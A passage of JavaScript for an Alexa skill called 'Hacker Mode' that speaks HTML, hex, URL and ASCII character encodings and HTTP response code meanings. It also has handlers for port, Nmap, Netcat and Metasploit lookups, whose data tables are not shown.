        "grave": { "speech": "ampersand pound 96 semi-colon", "card" : "&#96;"},
        "a": { "speech": "ampersand pound 97 semi-colon", "card" : "&#97;"},
        "b": { "speech": "ampersand pound 98 semi-colon", "card" : "&#98;"},
        "c": { "speech": "ampersand pound 99 semi-colon", "card" : "&#99;"},
        "d": { "speech": "ampersand pound 100 semi-colon", "card" : "&#100;"},
        "e": { "speech": "ampersand pound 101 semi-colon", "card" : "&#101;"},
        "f": { "speech": "ampersand pound 102 semi-colon", "card" : "&#102;"},
        "g": { "speech": "ampersand pound 103 semi-colon", "card" : "&#103;"},
        "h": { "speech": "ampersand pound 104 semi-colon", "card" : "&#104;"},
        "i": { "speech": "ampersand pound 105 semi-colon", "card" : "&#105;"},
        "j": { "speech": "ampersand pound 106 semi-colon", "card" : "&#106;"},
        "k": { "speech": "ampersand pound 107 semi-colon", "card" : "&#107;"},
        "l": { "speech": "ampersand pound 108 semi-colon", "card" : "&#108;"},
        "m": { "speech": "ampersand pound 109 semi-colon", "card" : "&#109;"},
        "n": { "speech": "ampersand pound 110 semi-colon", "card" : "&#110;"},
        "o": { "speech": "ampersand pound 111 semi-colon", "card" : "&#111;"},
        "p": { "speech": "ampersand pound 112 semi-colon", "card" : "&#112;"},
        "q": { "speech": "ampersand pound 113 semi-colon", "card" : "&#113;"},
        "r": { "speech": "ampersand pound 114 semi-colon", "card" : "&#114;"},
        "s": { "speech": "ampersand pound 115 semi-colon", "card" : "&#115;"},
        "t": { "speech": "ampersand pound 116 semi-colon", "card" : "&#116;"},
        "u": { "speech": "ampersand pound 117 semi-colon", "card" : "&#117;"},
        "v": { "speech": "ampersand pound 118 semi-colon", "card" : "&#118;"},
        "w": { "speech": "ampersand pound 119 semi-colon", "card" : "&#119;"},
        "x": { "speech": "ampersand pound 120 semi-colon", "card" : "&#120;"},
        "y": { "speech": "ampersand pound 121 semi-colon", "card" : "&#121;"},
        "z": { "speech": "ampersand pound 122 semi-colon", "card" : "&#122;"},
        "left curly brace": { "speech": "ampersand pound 123 semi-colon", "card" : "&#123;"},
        "pipe": { "speech": "ampersand pound 124 semi-colon", "card" : "&#124;"},
        "right curly brace": { "speech": "ampersand pound 125 semi-colon", "card" : "&#125;"},
        "squiggle": { "speech": "ampersand pound 126 semi-colon", "card" : "&#126;"},
        "empty": { "speech": "ampersand pound 127 semi-colon", "card" : "&#127;"},
		"delete": { "speech": "ampersand pound 127 semi-colon", "card" : "&#127;"},
        "euro": { "speech": "ampersand pound 128 semi-colon, or ampersand e u r o semi-colon", "card" : "&#128; or &euro;"},
        "blank": { "speech": "ampersand pound 129 semi-colon", "card" : "&#129;"},
        "quote comma": { "speech": "ampersand pound 130 semi-colon, or ampersand s b q u o semi-colon", "card" : "&#130; or &sbquo;"},
        "fnot": { "speech": "ampersand pound 131 semi-colon, or ampersand f n o t semi-colon", "card" : "&#131; or &fnot;"},
        "lowerquotes": { "speech": "ampersand pound 132 semi-colon, ampersand b d q u o semi-colon", "card" : "&#132; or &bdquo;"},
        "ellipsis": { "speech": "ampersand pound 133 semi-colon, ampersand h e l l i p semi-colon", "card" : "&#133; or &hellip;"},
        "dagger": { "speech": "ampersand pound 134 semi-colon, ampersand d a g g e r semi-colon", "card" : "&#134; or &dagger;"},
        "left side quote": { "speech": "ampersand pound 145 semi-colon, ampersand l s q u o semi-colon", "card" : "&#145; or &lsquo;"},
        "right side quote": { "speech": "ampersand pound 146 semi-colon, ampersand r s q u o semi-colon", "card" : "&#146; or &rsquo;"},
        "left double quote": { "speech": "ampersand pound 147 semi-colon, ampersand l d q u o semi-colon", "card" : "&#147; or &ldquo;"},
        "right double quote": { "speech": "ampersand pound 148 semi-colon, ampersand r d q u o semi-colon", "card" : "&#148; or &rdquo;"},
        "tilde": { "speech": "ampersand pound 152 semi-colon, ampersand t i l d e semi-colon", "card" : "&#152; or &tilde;"}
		}};   
  
const charencodings = {   "CHAR_EN_US" : {
        "null": { "speech": "", "card" : "0"},
        "bell": { "speech": "", "card" : "7"},
        "back space": { "speech": "", "card" : "8"},
        "tab": { "speech": "", "card" : "9"},
        "line feed": { "speech": "", "card" : "10"},
		"enter": { "speech": "", "card" : "10"},
        "vertical tab": { "speech": "", "card" : "11"},
        "form feed": { "speech": "", "card" : "12"},
        "carriage return": { "speech": "", "card" : "13"},
        "return": { "speech": "", "card" : "13"},
        "data line escape": { "speech": "", "card" : "16"},
        "negative ack": { "speech": "", "card" : "21"},
        "syn": { "speech": "", "card" : "22"},
        "end of block": { "speech": "", "card" : "23"},
        "cancel": { "speech": "", "card" : "24"},
        "escape": { "speech": "", "card" : "27"},
        "space": { "speech": "", "card" : "32"},
        "exclamation": { "speech": "", "card" : "33"},
        "double quote": { "speech": "", "card" : "34"},
        "pound": { "speech": "", "card" : "35"},
        "dollar sign": { "speech": "", "card" : "36"},
        "percent": { "speech": "", "card" : "37"},
        "ampersand": { "speech": "", "card" : "38"},
        "single quote": { "speech": "", "card" : "39"},
        "left paren": { "speech": "", "card" : "40"},
        "right paren": { "speech": "", "card" : "41"},
        "star": { "speech": "", "card" : "42"},
        "plus": { "speech": "", "card" : "43"},
        "comma": { "speech": "", "card" : "44"},
        "minus": { "speech": "", "card" : "45"},
        "period": { "speech": "", "card" : "46"},
        "forward slash": { "speech": "", "card" : "47"},
        "zero": { "speech": "", "card" : "48"},
        "one": { "speech": "", "card" : "49"},
        "two": { "speech": "", "card" : "50"},
        "three": { "speech": "", "card" : "51"},
        "four": { "speech": "", "card" : "52"},
        "five": { "speech": "", "card" : "53"},
        "six": { "speech": "", "card" : "54"},
        "seven": { "speech": "", "card" : "55"},
        "eight": { "speech": "", "card" : "56"},
        "nine": { "speech": "", "card" : "57"},
        "colon": { "speech": "", "card" : "58"},
        "semicolon": { "speech": "", "card" : "59"},
        "less than": { "speech": "", "card" : "60"},
        "equals": { "speech": "", "card" : "61"},
        "equal": { "speech": "", "card" : "61"},
        "equal sign": { "speech": "", "card" : "61"},
        "greater than": { "speech": "", "card" : "62"},
        "question mark": { "speech": "", "card" : "63"},
        "at sign": { "speech": "", "card" : "64"},
        "at": { "speech": "", "card" : "64"},
        "capital a": { "speech": "", "card" : "65"},
        "capital b": { "speech": "", "card" : "66"},
        "capital c": { "speech": "", "card" : "67"},
        "capital d": { "speech": "", "card" : "68"},
        "capital e": { "speech": "", "card" : "69"},
        "capital f": { "speech": "", "card" : "70"},
        "capital g": { "speech": "", "card" : "71"},
        "capital h": { "speech": "", "card" : "72"},
        "capital i": { "speech": "", "card" : "73"},
        "capital j": { "speech": "", "card" : "74"},
        "capital k": { "speech": "", "card" : "75"},
        "capital l": { "speech": "", "card" : "76"},
        "capital m": { "speech": "", "card" : "77"},
        "capital n": { "speech": "", "card" : "78"},
        "capital o": { "speech": "", "card" : "79"},
        "capital p": { "speech": "", "card" : "80"},
        "capital q": { "speech": "", "card" : "81"},
        "capital r": { "speech": "", "card" : "82"},
        "capital s": { "speech": "", "card" : "83"},
        "capital t": { "speech": "", "card" : "84"},
        "capital u": { "speech": "", "card" : "85"},
        "capital v": { "speech": "", "card" : "86"},
        "capital w": { "speech": "", "card" : "87"},
        "capital x": { "speech": "", "card" : "88"},
        "capital y": { "speech": "", "card" : "89"},
        "capital z": { "speech": "", "card" : "90"},
		"upper case a": { "speech": "", "card" : "65"},
        "upper case b": { "speech": "", "card" : "66"},
        "upper case c": { "speech": "", "card" : "67"},
        "upper case d": { "speech": "", "card" : "68"},
        "upper case e": { "speech": "", "card" : "69"},
        "upper case f": { "speech": "", "card" : "70"},
        "upper case g": { "speech": "", "card" : "71"},
        "upper case h": { "speech": "", "card" : "72"},
        "upper case i": { "speech": "", "card" : "73"},
        "upper case j": { "speech": "", "card" : "74"},
        "upper case k": { "speech": "", "card" : "75"},
        "upper case l": { "speech": "", "card" : "76"},
        "upper case m": { "speech": "", "card" : "77"},
        "upper case n": { "speech": "", "card" : "78"},
        "upper case o": { "speech": "", "card" : "79"},
        "upper case p": { "speech": "", "card" : "80"},
        "upper case q": { "speech": "", "card" : "81"},
        "upper case r": { "speech": "", "card" : "82"},
        "upper case s": { "speech": "", "card" : "83"},
        "upper case t": { "speech": "", "card" : "84"},
        "upper case u": { "speech": "", "card" : "85"},
        "upper case v": { "speech": "", "card" : "86"},
        "upper case w": { "speech": "", "card" : "87"},
        "upper case x": { "speech": "", "card" : "88"},
        "upper case y": { "speech": "", "card" : "89"},
        "upper case z": { "speech": "", "card" : "90"},
        "left square bracket": { "speech": "", "card" : "91"},
        "slash": { "speech": "", "card" : "92"},
        "right square bracket": { "speech": "", "card" : "93"},
        "carret": { "speech": "", "card" : "94"},
        "underscore": { "speech": "", "card" : "95"},
        "grave": { "speech": "", "card" : "96"},
        "a": { "speech": "", "card" : "97"},
        "b": { "speech": "", "card" : "98"},
        "c": { "speech": "", "card" : "99"},
        "d": { "speech": "", "card" : "100"},
        "e": { "speech": "", "card" : "101"},
        "f": { "speech": "", "card" : "102"},
        "g": { "speech": "", "card" : "103"},
        "h": { "speech": "", "card" : "104"},
        "i": { "speech": "", "card" : "105"},
        "j": { "speech": "", "card" : "106"},
        "k": { "speech": "", "card" : "107"},
        "l": { "speech": "", "card" : "108"},
        "m": { "speech": "", "card" : "109"},
        "n": { "speech": "", "card" : "110"},
        "o": { "speech": "", "card" : "111"},
        "p": { "speech": "", "card" : "112"},
        "q": { "speech": "", "card" : "113"},
        "r": { "speech": "", "card" : "114"},
        "s": { "speech": "", "card" : "115"},
        "t": { "speech": "", "card" : "116"},
        "u": { "speech": "", "card" : "117"},
        "v": { "speech": "", "card" : "118"},
        "w": { "speech": "", "card" : "119"},
        "x": { "speech": "", "card" : "120"},
        "y": { "speech": "", "card" : "121"},
        "z": { "speech": "", "card" : "122"},
        "left curly brace": { "speech": "", "card" : "123"},
        "pipe": { "speech": "", "card" : "124"},
        "right curly brace": { "speech": "", "card" : "125"},
        "squiggle": { "speech": "", "card" : "126"},
        "empty": { "speech": "", "card" : "127"},
		"delete": { "speech": "", "card" : "127"},
        "euro": { "speech": "", "card" : "128"},
        "blank": { "speech": "", "card" : "129"},
        "quote comma": { "speech": "", "card" : "130"},
        "fnot": { "speech": "", "card" : "131"},
        "lowerquotes": { "speech": "", "card" : "132"},
        "ellipsis": { "speech": "", "card" : "133"},
        "dagger": { "speech": "", "card" : "134"},
        "left side quote": { "speech": "", "card" : "145"},
        "right side quote": { "speech": "", "card" : "146"},
        "left double quote": { "speech": "", "card" : "147"},
        "right double quote": { "speech": "", "card" : "148"},
        "tilde": { "speech": "", "card" : "152"}
		}};
	
const responsecodes = {   "RESPONSECODES_EN_US" : {
 	"100": "100 or Continue, tells the client that it should finish sending the next portion of the request.",
	"101": "101 Switching Protocols means that the server had a positive response to the request and is initiating a new protocol other than HTTP with the Upgrade header.",
	"200": "200 OK. The OK response indicates success. GET returns the resource in the response, POST returns an entity describig the results of the post.",
	"201": "201 Created indicates that the request was received and processed and resulted in the creation of a resource.",
	"202": "202 or Accepted indicates that a request has been accepted for asynchronous processing.",
	"203": "203 Non-Authoritative Information is returned when a response contains a copy of data which is not from the origin server.",
	"204": "204 or No Content, is a response that lets the user agent know the action was successful but no response body will be returned for the action, but headers may contain information about the results of the request.",
	"205": "205 Reset Content tells the user agent to reset the document view. This code was intended to assist with user input actions so that input forms could be reset.",
	"206": "206 or Partial Content is a response to a request which specified a range.",
	"300": "300 or Multiple Choices, means that a resource may be found at several different locations. The response should contain a list of the locations.",
	"301": "301 or Moved Permanently, means that the resource has been moved to a different URI. The new URI should be returned in the Location response header.",
	"302": "302 or Found, indicates that the requested resource is located at a different URI. The URI should be specified in the Location resonse header. ",
	"303": "303 or See Other. The request may be able to be satisfied by a resource at a different URI.",
	"304": "304 is Not Modified. Requests that specify headers which retrieve data if the data has changed may recieve this response.",
	"305": "305 is Use Proxy. The requested URI must be requested via the proxy specified in the Location header.",
	"306": "306 is Unused. Response code 306 is not supported in the current HTTP specification.",
	"307": "307 Temporary Redirect. The requested URI is temporarily located elsewhere.",
	"400": "400 Bad Request.",
	"401": "401 is Unauthorized. The response should include a WWW authenticate header.",
	"402": "402 is Payment Required. This code is reserved for pay wall functionality.",
	"403": "403 is Forbidden. The reason for the forbidden request should be specified in the response.",
	"404": "404 is Not Found. The server was not able to find the URI or the request is being disallowed for unspecified reasons.",
	"405": "405 is Method Not Allowed. The response should include an Allow header that specifies accepted methods.",
	"406": "406 is Not Acceptable. Not Acceptable means that the request headers specify that the content type the server is able to respond with is explicitly not supported.",
	"407": "407 is Proxy Authentication Required.",
	"408": "408 is Request Timeout.",
	"409": "409 is Conflict. Responding to the request would cause a state problem, or data contention issue. A list of differences in the resource data may be returned along with this response code.",
	"410": "410 is Gone. The Gone response indicates that the requested resource is not available and has no forwarding information.",
	"411": "411 is Length Required.",
	"412": "412 is Precondition Failed.",
	"413": "413 is Request Entity Too Large.",
	"414": "414 is Request URI Too Long",
	"415": "415 is Unsupported Media Type.",
	"416": "416 is Request Range Not Satisfiable. This is recieved when a Range header provided a range that does not match what the server can provide.",
	"417": "417 is Expectation Failed. Or, a request header field could not be honored by the server.",
	"500": "500 is Internal Server Error",
	"501": "501 is Not Implemented.",
	"502": "502 is Bad Gateway",
	"503": "503 is Service Unavailable.",
	"504": "504 is Gateway Timeout.",
	"505": "505 is HTTP Version Not Supported."
}};	
		
  
const APP_ID = "Hacker Mode"; // TODO replace with your app ID (OPTIONAL).
 
        function getRandomInt(low, high) { 
             return Math.floor(Math.random() * (high - low + 1)) + low;
         }
         
const handlers = {
    'NewSession': function () {
        console.log("-NewSession");
		var randomN = getRandomInt(0,3);
		var welcomeMessage="Random Number is ";
		if (randomN === 0) {welcomeMessage = this.t('WELCOME_MESSAGE0')} 
			else if (randomN === 1) {welcomeMessage = this.t('WELCOME_MESSAGE1')} 
			else if (randomN === 2) {welcomeMessage=this.t('WELCOME_MESSAGE2')}
			else if (randomN === 2) {welcomeMessage=this.t('WELCOME_MESSAGE3')}
			else {welcomeMessage=this.t('WELCOME_MESSAGE4')}
        this.attributes.speechOutput = welcomeMessage;  //this.t('WELCOME_MESSAGE', this.t('SKILL_NAME'));
        // If the user either does not reply to the welcome message or says something that is not
        // understood, they will be prompted again with this text.
        this.attributes.repromptSpeech = this.t('WELCOME_REPROMPT');
        this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
    },      

	
	'KnownPortsIntent': function () {
        const itemSlot = this.event.request.intent.slots.NUMItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
        }      
        
        const cardTitle = this.t('PORTS_DISPLAY_CARD_TITLE', this.t('SKILL_NAME'), itemName);
        const myPorts = this.t('PORTS');
        const ports = myPorts[itemName];
               
        if (ports) {
            this.attributes.speechOutput = ports;
            this.attributes.repromptSpeech = this.t('WEBHEADERS_REPEAT_MESSAGE');
            this.emit(':askWithCard', ports, this.attributes.repromptSpeech, cardTitle, ports);
        } else {
            let speechOutput = this.t('PORTS_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('PORTS_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('PORTS_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('PORTS_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('KnownPortsIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 
	
    'WebHeadersIntent': function () {
        const itemSlot = this.event.request.intent.slots.WHItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace(".","");
        }      
               
        const cardTitle = this.t('WEBHEADERS_DISPLAY_CARD_TITLE', itemName);
        const myWebHeaders = this.t('WEBHEADERS');
        const webheaders = myWebHeaders[itemName];
               
        if (webheaders) {
            this.attributes.speechOutput = webheaders;
            this.attributes.repromptSpeech = this.t('WEBHEADERS_REPEAT_MESSAGE');
            this.emit(':askWithCard', webheaders, this.attributes.repromptSpeech, cardTitle, webheaders);
        } else {
            let speechOutput = this.t('WEBHEADERS_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('WEBHEADERS_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('WEBHEADERS_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('WEBHEADERS_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('WebHeadersIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 


    'HTTPVerbsIntent': function () {
        const itemSlot = this.event.request.intent.slots.HVItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
        }      
               
        const cardTitle = this.t('HTTPVERBS_DISPLAY_CARD_TITLE', itemName);
        const myHTTPVerbs = this.t('HTTPVERBS');
        const httpverbs = myHTTPVerbs[itemName];
               
        if (httpverbs) {
            this.attributes.speechOutput = httpverbs;
            this.attributes.repromptSpeech = this.t('HTTPVERBS_REPEAT_MESSAGE');
            this.emit(':askWithCard', httpverbs, this.attributes.repromptSpeech, cardTitle, httpverbs);
        } else {
            let speechOutput = this.t('HTTPVERBS_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('HTTPVERBS_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('HTTPVERBS_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('HTTPVERBS_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('HTTPVerbsIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
                    console.log('HTTPVerbsIntent');this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 

    'NmapIntent': function () {
        const itemSlot = this.event.request.intent.slots.NMItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
        }      
               
        const cardTitle = this.t('NMAP_DISPLAY_CARD_TITLE', itemName);
        const myNmap = this.t('NMAP');
        const nmap = myNmap[itemName];
               
        if (nmap) {
            this.attributes.speechOutput = nmap.speech;
            this.attributes.repromptSpeech = this.t('NMAP_REPEAT_MESSAGE');
            this.emit(':askWithCard', nmap.speech, this.attributes.repromptSpeech, cardTitle, nmap.card);
        } else {
            let speechOutput = this.t('NMAP_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('NMAP_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('NMAP_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('NMAP_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('NmapIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 

    'NetcatIntent': function () {
        const itemSlot = this.event.request.intent.slots.NCItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
        }      
               
        const cardTitle = this.t('NETCAT_DISPLAY_CARD_TITLE', itemName);
        const myNetcat = this.t('NETCAT');
        const netcat = myNetcat[itemName];
               
        if (netcat) {
            this.attributes.speechOutput = netcat.speech;
            this.attributes.repromptSpeech = this.t('NETCAT_REPEAT_MESSAGE');
            this.emit(':askWithCard', netcat.speech, this.attributes.repromptSpeech, cardTitle, netcat.card);
        } else {
            let speechOutput = this.t('NETCAT_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('NETCAT_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('NETCAT_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('NETCAT_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('NetcatIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 

    'MetasploitIntent': function () {
        const itemSlot = this.event.request.intent.slots.MSFItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
        }      
               
        const cardTitle = this.t('METASPLOIT_DISPLAY_CARD_TITLE', itemName);
        const myMetasploit = this.t('METASPLOIT');
        const metasploit = myMetasploit[itemName];
               
        if (metasploit) {
            this.attributes.speechOutput = metasploit.speech;  // set the speech sub item type
            this.attributes.repromptSpeech = this.t('METASPLOIT_REPEAT_MESSAGE');
            this.emit(':askWithCard', metasploit.speech, this.attributes.repromptSpeech, cardTitle, metasploit.card);  // set the card output to the card item sub type
        } else {
            let speechOutput = this.t('METAPSLOIT_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('METASPLOIT_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('METASPLOIT_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('METASPLOIT_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('MetasploitIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 

	// HTML encoding intent uses different output for speech and for card in order to preserve syntax for the card output
    'HTMLEncodingIntent': function () {
        const itemSlot = this.event.request.intent.slots.CHARItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('HTMLENCODING_DISPLAY_CARD_TITLE', itemName);
        const myHTMLEncodings = this.t('HTMLENCODINGS');
        const encoding = myHTMLEncodings[itemName];
        //this.emit(':ask',itemName + " <> " + myHTMLEncodings[1]+ myHTMLEncodings[2]+ myHTMLEncodings[3]+ myHTMLEncodings[4]);       
        if (encoding) {
            this.attributes.speechOutput = itemName + " is represented by " + encoding.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('HTMLENCODING_REPEAT_MESSAGE');
            this.emit(':askWithCard', encoding.speech, this.attributes.repromptSpeech, cardTitle + itemName, encoding.card);  // sub item card
        } else {
            let speechOutput = this.t('HTMLENCODING_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('HTMLENCODING_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('HTMLENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('HTMLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('HTMLEncodingIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    },  

	//HEX encoding rder to preserve syntax for the card output
    'HexEncodingIntent': function () {
        const itemSlot = this.event.request.intent.slots.CHARItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('HEXENCODING_DISPLAY_CARD_TITLE', itemName);
        const myEncodings = this.t('CHARENCODINGS');
        const encoding =  myEncodings[itemName];
        
         var str = Number(encoding.card).toString(16);
		 if (str.length <=1) { str = "0" + str;}
			encoding.speech = str  + " or 0 x " + str;
			encoding.card = encoding.speech;
			   
        if (encoding) {
            this.attributes.speechOutput =  encoding; //encoding.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('HEXENCODING_REPEAT_MESSAGE');
            this.emit(':askWithCard', encoding.speech, this.attributes.repromptSpeech, cardTitle, encoding.card); // encoding.card);  // sub item card
        } else {
            let speechOutput = this.t('HEXENCODING_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('HEXENCODING_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('HEXENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
           // speechOutput += repromptSpeech;
            console.log('HexEncodingIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    },  
	
	//ASCII encoding rder to preserve syntax for the card output
    'ASCIIEncodingIntent': function () {
        const itemSlot = this.event.request.intent.slots.CHARItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('ASCIIENCODING_DISPLAY_CARD_TITLE', itemName);
        const myEncodings = this.t('CHARENCODINGS');
        const encoding =  myEncodings[itemName];
          
        if (encoding) {
			encoding.speech = encoding.card;
            this.attributes.speechOutput = encoding; //encoding.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('ASCIIENCODING_REPEAT_MESSAGE');
            this.emit(':askWithCard', encoding.speech , this.attributes.repromptSpeech, cardTitle, encoding.card);
        } else {
            let speechOutput = this.t('ASCIIENCODING_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('ASCIIENCODING_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('ASCIIENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            // speechOutput += repromptSpeech;
            console.log('ASCIIEncodingIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 	
	
	//URL encoding rder to preserve syntax for the card output
    'URLEncodingIntent': function () {
        const itemSlot = this.event.request.intent.slots.CHARItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('URLENCODING_DISPLAY_CARD_TITLE', itemName);
        const myEncodings = this.t('CHARENCODINGS');
        const encoding =  myEncodings[itemName];
		var e = Number(encoding.card).toString(16);
		if (e.length <= 1) {e= "0" + e;}
		encoding.speech = "%" + e; 
		encoding.card = encoding.speech;
        if (encoding) {
            this.attributes.speechOutput = encoding;  // sub item speech
            this.attributes.repromptSpeech = this.t('URLENCODING_REPEAT_MESSAGE');
            this.emit(':askWithCard', encoding.speech, this.attributes.repromptSpeech, cardTitle, encoding.card); 
            } else {
            let speechOutput = this.t('URLENCODING_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('URLENCODING_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('URLENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('URLEncodingIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 
	
	//HTTP response code 
    'HTTPResponseIntent': function () {
        const itemSlot = this.event.request.intent.slots.RCItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toString();
            //itemName = itemName.replace('.', '');
            //console.log('HTTPResponseIntent>' + itemName);
        }      
               
        const cardTitle = this.t('RESPONSECODE_DISPLAY_CARD_TITLE', itemName);
        const myResponseCodes = this.t('RESPONSECODES');
        const responsecode =  myResponseCodes[itemName];
               
        if (responsecode) {
            this.attributes.speechOutput = responsecode; //responsecode.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('RESPONSECODES_REPEAT_MESSAGE');
            this.emit(':askWithCard', responsecode , this.attributes.repromptSpeech, cardTitle, responsecode);
        } else {
            let speechOutput = this.t('RESPONSECODES_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('RESPONSECODES_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('RESPONSECODES_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('RESPONSECODES_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            // speechOutput += repromptSpeech;
            console.log('HTTPResponseIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 	
	
    'AMAZON.HelpIntent': function () {
        this.attributes.speechOutput = this.t('HELP_MESSAGE');
        this.attributes.repromptSpeech = this.t('HELP_REPROMT');
        this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
    },         
    'AMAZON.RepeatIntent': function () {
        this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
    },         
    'AMAZON.StopIntent': function () {
        this.emit('SessionEndedRequest');
    },         
    'AMAZON.CancelIntent': function () {
        this.emit('SessionEndedRequest');
    },         
    'SessionEndedRequest': function () {
        this.emit(':tell', this.t('STOP_MESSAGE'));
    },         
};             
               
const languageStrings = {
    'en-US': { 
        translation: {
            HTMLENCODINGS: htmlencodings.HTML_EN_US,
            CHARENCODINGS: charencodings.CHAR_EN_US,
			WEBHEADERS: webheaders.WEBHEADERS_EN_US,
			HTTPVERBS: httpverbs.HTTPVERBS_EN_US,
			PORTS: ports.PORTS_EN_US,
